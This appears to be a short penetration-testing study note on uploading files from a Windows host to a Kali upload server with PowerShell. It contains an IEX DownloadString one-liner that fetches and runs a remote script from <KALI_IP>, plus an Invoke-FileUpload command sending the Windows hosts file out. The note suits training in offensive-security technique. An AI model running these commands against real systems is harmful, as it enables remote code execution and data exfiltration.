PSUpload. Here it is PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads Installing/Starting Upload server on KALI

`pip3 install uploadserver python3 -m uploadserver`

Download `PSUpload.ps1` to KALI: `wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1` Import Powershell script to upload a file to KALI upload server `IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/PSUpload.ps1')` `Invoke-FileUpload -Uri http://<KALI_IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts`